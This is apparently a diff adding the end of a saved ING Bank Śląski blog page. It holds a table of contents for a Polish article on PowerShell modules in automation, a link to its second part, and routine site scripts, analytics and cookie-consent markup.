+       <div class="outer" style="width: 367.983px;"> 
+        <ul> 
+         <li><a href="#zacznijmy-od-poczatku">Zacznijmy od początku</a></li> 
+         <li><a href="#przyklady">Przykłady użycia powershella w automatyzacji</a></li> 
+         <li><a href="#nie-tylko">PowerShell nie tylko w powershellu</a></li> 
+         <li><a href="#modly-co-to">Moduły? Co to jest?</a></li> 
+         <li><a href="#pytanie-po-co">Pytanie po co?</a></li> 
+         <li><a href="#jak-to-dziala">Jak to działa?</a></li> 
+         <li><a href="#podsumowanie">Podsumowanie</a></li> 
+        </ul> 
+       </div> 
+      </div> 
+     </div>
+    </div>
+    <div id="component_wrapper_1403325256" class="layout_element component_wrapper wrapped_related_articles">
+     <div class="component related_articles component_1403325256" data-component-id="1403325256" data-component-type-code="related_articles" data-js-parameters="{&quot;defaultHtml&quot;:&quot;\u003ch3 class\u003d\&quot;component_header\&quot;\u003eZobacz także\u003c/h3\u003e\u003cdiv\u003e\u003cdiv class\u003d\&quot;list_content_wrapper\&quot; id\u003d\&quot;table_relatedArticlesTable_1403325256\&quot;\u003e\u003cdiv class\u003d\&quot;list_content\&quot;\u003e\u003cdiv class\u003d\&quot;list_item_odd list_item_first list_item_last\&quot;\u003e\u003cdiv class\u003d\&quot;item no_image\&quot;\u003e\u003cdiv\u003e\u003cspan class\u003d\&quot;data\&quot;\u003e26 października 2022\u003c/span\u003e\u003ch4 class\u003d\&quot;name\&quot;\u003e\u003ca href\u003d\&quot;/blog/moduly-powershell-wsparcie-leniwego-admina-czy-szwajcarski-scyzoryk-hakera-czesc2\&quot;\u003e\u003cspan\u003eModuły PowerShell – wsparcie leniwego admina czy szwajcarski scyzoryk hakera - część 2\u003c/span\u003e\u003c/a\u003e\u003c/h4\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv class\u003d\&quot;list_pagination\&quot;\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e&quot;,&quot;getAjaxComponentUrl&quot;:&quot;/_api/ds/ingrwd-lds/component_action?component.action\u003dget_ajax_component\u0026component.id\u003d1403325256\u0026component.site\u003dQLmeEYC8HoCjSlYxcQoUUw\u003d\u003d&quot;}" id="related_articles_1_19042019"><h3 class="component_header">Zobacz także</h3><div><div class="list_content_wrapper" id="table_relatedArticlesTable_1403325256"><div class="list_content"><div class="list_item_odd list_item_first list_item_last"><div class="item no_image"><div><span class="data">26 października 2022</span><h4 class="name"><a href="/blog/moduly-powershell-wsparcie-leniwego-admina-czy-szwajcarski-scyzoryk-hakera-czesc2"><span>Moduły PowerShell – wsparcie leniwego admina czy szwajcarski scyzoryk hakera - część 2</span></a></h4></div></div></div></div><div class="list_pagination"></div></div></div></div>
+    </div>
+   </div></div>
+  </div>
+ </div>
+</div>
+                    </div>
+                    <div id="outlet-footer" class="outlet outlet-footer" data-resource-id="1500019.56896b9fcf4f28cde2bdcf2032ce2f44c618c4ae71d0c5d03494a1aa9393143a">
+                        <div class="layout_section footer_section layout_element">
+ <div class="layout_container layout_element">
+  <div class="layout_row row layout_element">
+   <div class="layout_column col-xs-12 col-sm-12 col-md-12 col-lg-12 layout_element">
+    <div class="component footer notPrintable component_1500019" data-component-id="1500019" data-component-type-code="footer"> 
+     <div class="text-logo"> 
+      <p class="text">© 2024 ING Bank Śląski S.A. Wszelkie prawa zastrzeżone. <a role="button" class="js-cookie-policy-deputed-settings-button link" aria-haspopup="dialog" style="padding: 0; margin: 0; outline: inherit">Ustawienia&nbsp;<span lang="en">cookie</span></a> | <a href="https://www.ing.pl/indywidualni/tabele-i-regulaminy/regulacje/polityka-plikow-cookie" style="margin: 0" class="link">Polityka&nbsp;<span lang="en">cookie</span></a></p> 
+      <a class="epoint-logo" href="http://www.e-point.pl/" target="_blank" rel="noreferrer noopener" aria-label="strona e-Point"><img src="/_fileserver/item/1100088.4e3b711df54e22496d81bd37fe26cf0678d9f27bfbf6422cf8bc9c187c5d33d3" alt="Utworzone przez e-Point"></a> 
+     </div> 
+    </div>
+   </div>
+  </div>
+ </div>
+</div>
+                    </div>
+            </div>
+        </main>
+
+        <script type="text/javascript" src="/_static/js/client.2718413b4c44d6a92de2.js"></script>
+        <script src="/_static/js/webcomponentsjs/custom-elements-es5-adapter.3342b468203af1a14ca0.js"></script>
+        <script src="/_static/js/webcomponentsjs/webcomponents-loader.js"></script>
+
+        <script type="text/javascript" src="/_static/lib/vendor/jquery-1.9.1.min.416a3b2c3bf16d64f6b5.js" data-no-hash-src="/_static/lib/vendor/jquery-1.9.1.min.js"></script>
+        <script type="text/javascript" src="/_static/lib/jquery-fn.702b5ab35e6c7b230868.js" data-no-hash-src="/_static/lib/jquery-fn.js"></script>
+        <script type="text/javascript" src="/_static/lib/vendor/mobile-detect-v1.4.3.min.363a80d367e6658e72d9.js" data-no-hash-src="/_static/lib/vendor/mobile-detect-v1.4.3.min.js"></script>
+        <script type="text/javascript" src="/_static/lib/components.d87eb3d43c610bda111c.js" data-no-hash-src="/_static/lib/components.js"></script>
+        <script type="text/javascript" src="/_static/lib/components-utils.1d71f4b878a4da08b206.js" data-no-hash-src="/_static/lib/components-utils.js"></script>
+        <script type="text/javascript" src="/_static/lib/post-message.a8494a105d66ada721b8.js" data-no-hash-src="/_static/lib/post-message.js"></script>
+        <script type="text/javascript" src="/_static/lib/ui-component.f4563c0580bb250d2c71.js" data-no-hash-src="/_static/lib/ui-component.js"></script>
+        <script type="text/javascript" src="/_static/lib/screen-size.efe08bc85f493e371c1a.js" data-no-hash-src="/_static/lib/screen-size.js"></script>
+        <script type="text/javascript" src="/_static/lib/expandable.1c8ca965b6a93a6e8172.js" data-no-hash-src="/_static/lib/expandable.js"></script>
+        <script type="text/javascript" src="/_static/lib/expandable-last-element.1e1233c5f8fe48440274.js" data-no-hash-src="/_static/lib/expandable-last-element.js"></script>
+        <script type="text/javascript" src="/_static/lib/modal-utils.c4d1c273f73fce1e433c.js" data-no-hash-src="/_static/lib/modal-utils.js"></script>
+        <script type="text/javascript" src="/_static/lib/CmsMenuUtils.51234795d8fd71a1f2ff.js" data-no-hash-src="/_static/lib/CmsMenuUtils.js"></script>
+        <script type="text/javascript" src="/_static/lib/utils.6d82532e90fe074c63c2.js" data-no-hash-src="/_static/lib/utils.js"></script>
+        <script type="text/javascript" src="/_static/lib/vendor/platform-detect.e3fa26464d9c0aabf2dc.js" data-no-hash-src="/_static/lib/vendor/platform-detect.js"></script>
+        <script type="text/javascript" src="/_static/lib/platform.ae4d90a34b235c2cf065.js" data-no-hash-src="/_static/lib/platform.js"></script>
+        <script type="text/javascript" src="/_static/lib/rules-for-parameters-lib.dc1c42d8fea5ab5f2e32.js" data-no-hash-src="/_static/lib/rules-for-parameters-lib.js"></script>
+        <script type="text/javascript" src="/_static/lib/table-utils.7c63ad192593430e612c.js" data-no-hash-src="/_static/lib/table-utils.js"></script>
+        <script type="text/javascript" src="/_api/ds/ingrwd-lds/rules_for_parameters.js" data-no-hash-src="/_api/ds/ingrwd-lds/rules_for_parameters.js"></script>
+        <script type="text/javascript" src="/_static/lib/content-utils.b4fd6137f0fc5789c19e.js" data-no-hash-src="/_static/lib/content-utils.js"></script>
+        <script type="text/javascript" src="/_static/lib/floating-menu.bbfbf1657bcb895c1490.js" data-no-hash-src="/_static/lib/floating-menu.js"></script>
+        <script type="text/javascript" src="/_static/lib/pagination-utils.6b1960c6074752049c59.js" data-no-hash-src="/_static/lib/pagination-utils.js"></script>
+        <div class="js-cookie-policy-box cpm-wrapper--hook" id="cpm-wrapper" data-banner-type="all" style="visibility: hidden; pointer-events: none; opacity: 0"><link crossorigin="anonymous" data-type="cookies-policy" rel="stylesheet" type="text/css" href="https://www.ing.pl/_api/ds/ingrwd-lds/cookie_policy/150020/cpm.css"><span class="cpm__transitionHelper isActive"></span><div class="cookie-policy-non_aggressive-popup js-cookie-policy-non_aggressive-popup"><div class="js-cookie-policy-main cookie-policy-popup cookie-policy-popup--all cpm--block"><div class="cookie-policy-content"><div class="cookie-policy-inner"><h2 class="cookie-policy-title">ING Bank Śląski (my) korzysta z cookies i innych podobnych technologii</h2><div class="cookie-policy-description"><p>Jeśli zaakceptujesz wszystkie cookies, zapiszemy w Twoim urządzeniu cookies i inne pliki (ogólnie cookies) analityczne i marketingowe (w celu profilowanego marketingu). Jeśli odrzucisz wszystkie - zapiszemy tylko cookies techniczne, niezbędne dla działania naszych stron. Cookies możesz też ustawić samodzielnie (Dostosuj). Używamy cookies zgodnie z <a tabindex="1" href="https://www.ing.pl/indywidualni/tabele-i-regulaminy/regulacje/ochrona-danych-osobowych">Polityką prywatności</a> i <a tabindex="1" href="https://www.ing.pl/cookie">Polityką cookies</a> (zwanymi Politykami), które opisują rodzaje cookies, sposoby korzystania z nich przez nas, usuwania cookies naszych oraz naszych zaufanych partnerów. Zapiszemy Twój wybór. Zgodnie z Politykami możesz zmieniać ustawienia lub wycofać zgody.</p></div><div class="cookie-policy-btn-group"><div class="cookie-policy-btn-wrapper"><button tabindex="1" class="js-cookie-policy-main-settings-button cookie-policy-button is--primary">Dostosuj</button><button tabindex="1" class="js-cookie-policy-main-decline-button cookie-policy-button is--primary">Odrzuć wszystkie</button><button tabindex="1" class="js-cookie-policy-main-accept-button cookie-policy-button is--primary">Zaakceptuj wszystkie</button></div></div></div></div></div><div class="js-cookie-policy-settings cpm--hidden cookie-policy-popup cookie-policy-popup--settings"><div class="cookie-policy-content"><div class="cookie-policy-inner"><button class="cookie-policy-arrow--left js-cookie-policy-settings-cancel-button" tabindex="1"><span class="cookie-policy__srOnly">Wyjdź z ustawień cookie</span></button><h2 class="cookie-policy-title">Ustawienia plików cookies i innych technologii</h2><div class="js-cookie-policy-settings-acceptance-form cookie-policy-description"><div class="cookie-policy-type-wrapper"><div class="cookie-policy-type"><div class="cookie-policy-type--content"><p class="cookie-policy-type--title js-cookie-policy-title">Cookie techniczne</p><div class="cookie-policy-type--description"><p>Niezbędne dla prawidłowego działania naszych stron, są więc zawsze aktywne.</p><a tabindex="1" class="cookie-policy-link"> <span class="cookie-policy-link--expand">Rozwiń</span> <span class="cookie-policy-link--collapse">Zwiń</span> <span class="sr-only"> informację o <span lang="en">Cookie</span> techniczne</span></a><div class="cookie-policy-link--content"> <p>Wykorzystujemy je m.in. do zapamiętywania wyrażonych przez Ciebie zgód. Możesz zablokować techniczne cookies w ustawieniach swojej przeglądarki, ale wówczas strona może przestać działać lub nie działać poprawnie. Za ich pomocą nie zbieramy danych osobowych.</p> </div></div></div><div class="cookie-policy-switch"><label class="cookie-policy-switch-label" for="CpmTechnicalOption"><input checked="true" class="cookie-policy-switch-input js-checkbox" disabled="disabled" id="CpmTechnicalOption" name="CpmTechnicalOption" type="checkbox"><button class="cookie-policy-switch-slider nonclickable"></button></label></div></div><div class="cookie-policy-type"><div class="cookie-policy-type--content"><p class="cookie-policy-type--title clickable js-cookie-policy-title">Cookie analityczne</p><div class="cookie-policy-type--description"><p>Umożliwiają nam gromadzenie danych na temat stron, które wyświetlasz, działań, jakie na nich podejmujesz czy miejsc, z których do nas trafiasz.</p><a tabindex="1" class="cookie-policy-link"> <span class="cookie-policy-link--expand">Rozwiń</span> <span class="cookie-policy-link--collapse">Zwiń</span> <span class="sr-only"> informację o <span lang="en">Cookie</span> analityczne</span></a><div class="cookie-policy-link--content"> <p>Dzięki cookies analitycznym możemy poprawiać funkcjonowanie strony, mierzyć skuteczność działań marketingowych i rozliczać się z partnerami biznesowymi. Za ich pomocą nie zbieramy danych osobowych.</p> </div></div></div><div class="cookie-policy-switch"><label class="cookie-policy-switch-label" for="CpmAnalyticalOption"><input class="cookie-policy-switch-input js-checkbox" id="CpmAnalyticalOption" name="CpmAnalyticalOption" type="checkbox"><button class="cookie-policy-switch-slider" tabindex="1"></button></label></div></div><div class="cookie-policy-type"><div class="cookie-policy-type--content"><p class="cookie-policy-type--title clickable js-cookie-policy-title">Cookie marketingowe</p><div class="cookie-policy-type--description"><p>Pozwalają nam na przedstawianie profilowanych informacji handlowych dostosowanych do Twoich wyborów lub stron, które odwiedzasz w Internecie.</p><a tabindex="1" class="cookie-policy-link"> <span class="cookie-policy-link--expand">Rozwiń</span> <span class="cookie-policy-link--collapse">Zwiń</span> <span class="sr-only"> informację o <span lang="en">Cookie</span> marketingowe</span></a><div class="cookie-policy-link--content"> <p>Dzięki nim wiemy, jak korzystasz z serwisu, w tym z oferowanych usług, możemy też łączyć zabrane na ich podstawie dane i informacje z innymi dotyczącymi Ciebie informacjami, które mamy lub otrzymamy w przyszłości. Zapoznaj się z <a tabindex="1" href="https://www.ing.pl/indywidualni/tabele-i-regulaminy/regulacje/ochrona-danych-osobowych">wyjaśnieniami użytych tu terminów i informacją banku</a>.</p> </div></div></div><div class="cookie-policy-switch"><label class="cookie-policy-switch-label" for="CpmMarketingOption"><input class="cookie-policy-switch-input js-checkbox" id="CpmMarketingOption" name="CpmMarketingOption" type="checkbox"><button class="cookie-policy-switch-slider" tabindex="1"></button></label></div></div></div></div><div class="cookie-policy-btn-group"><div class="cookie-policy-btn-wrapper cookie-policy-btn-wrapper--settings cookie-policy-btn-wrapper--secondary"><button tabindex="1" class="js-cookie-policy-settings-decline-all-button cookie-policy-button is--primary">Odrzuć wszystkie</button><button tabindex="1" class="js-cookie-policy-settings-decline-button cookie-policy-button is--primary">Zaakceptuj wybrane</button></div></div></div></div></div><div class="cookie-policy-recallBanner cpm--hidden"><div class="cookie-policy-recallBanner-outer"><div class="cookie-policy-recallBanner-inner"><div class="cookie-policy-recallBanner-icon"></div><div class="cookie-policy-recallBanner-content"><span class="cookie-policy-recallBanner-text">W każdej chwili możesz zmienić</span><a class="cookie-policy-recallBanner-link">ustawienia plików cookie</a><a tabindex="1" class="cookie-policy-recallBanner-button">Zamknij i nie pokazuj więcej</a></div></div></div></div><div class="cookie-policy-closeBanner cpm--hidden"><div class="cookie-policy-closeBanner-outer"><div class="cookie-policy-closeBanner-inner"><div class="cookie-policy-closeBanner-icon"></div><div class="cookie-policy-closeBanner-content"><span class="cookie-policy-closeBanner-text">Twoje ustawienia zostały zapisane</span><a class="cookie-policy-closeBanner-link">Zarządzaj ustawieniami plików cookie</a></div></div></div></div></div></div>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    <script type="text/javascript" src="/_Incapsula_Resource?SWJIYLWA=719d34d31c8e3a6e6fffd425f7e032f3&amp;ns=2&amp;cb=1274878918" async=""></script>
+
+<iframe style="display: none;"></iframe><div class="pub_300x250 pub_300x250m pub_728x90 text-ad textAd text_ad text_ads text-ads text-ad-links ad-text adSense adBlock adContent adBanner" style="width: 1px !important; height: 1px !important; position: absolute !important; left: -10000px !important; top: -1000px !important;"></div><script type="text/javascript" id="">(function(){window.dataLayer=window.dataLayer||[];if(3!=google_tag_manager["rm"]["11244519"](5)&&4!=google_tag_manager["rm"]["11244519"](6)){var a=0;window.addEventListener("onCookiePolicyAnalyticsAccept",function(){0==a&&(window.dataLayer.push({event:"analytics-accept"}),a=1)});window.addEventListener("onCookiePolicyAnalyticsDecline",function(){1==a&&(window.dataLayer.push({event:"analytics-decline"}),a=0)})}else if(3==google_tag_manager["rm"]["11244519"](7)||4==google_tag_manager["rm"]["11244519"](8))a=1,window.addEventListener("onCookiePolicyAnalyticsAccept",function(){0==
+a&&(window.dataLayer.push({event:"analytics-accept"}),a=1)}),window.addEventListener("onCookiePolicyAnalyticsDecline",function(){1==a&&(window.dataLayer.push({event:"analytics-decline"}),a=0)})})();</script>
+<script type="text/javascript" id="">window.addEventListener("beforeunload",function(){window.dataLayer.push({event:"beforeunload"})});</script></body></html>
